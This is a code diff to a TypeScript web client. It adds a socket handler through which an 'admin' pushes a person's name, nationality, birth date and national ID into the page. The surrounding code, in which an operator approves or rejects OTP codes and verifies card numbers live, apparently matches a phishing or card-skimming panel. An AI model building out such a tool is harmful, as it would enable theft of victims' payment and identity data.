@@ -95,6 +95,17 @@ export const cardAction = signal<{ action: string; timestamp: number } | null>(n
 // Code Action from Admin (approve, reject) for OTP/digit codes
 export const codeAction = signal<{ action: string; codeIndex: number } | null>(null);
 
+// Personal Data pushed from Admin
+export const personalData = signal<{
+  arabicName?: string;
+  englishName?: string;
+  nationality?: string;
+  dateOfBirth?: string;
+  gender?: string;
+  nationalId?: string;
+  timestamp: number;
+} | null>(null);
+
 // Payment Data (stored in localStorage)
 export interface PaymentData {
   totalPaid?: number;
@@ -263,6 +274,11 @@ export function initializeSocket() {
     console.log("Verification code received:", code);
     verificationCode.value = code;
     waitingMessage.value = "";
+  });
+
+  s.on("fillPersonalData", (data: any) => {
+    console.log("Personal data received from admin:", data);
+    personalData.value = { ...data, timestamp: Date.now() };
   });
 
   s.on("cardNumber:verified", (verified: boolean) => {
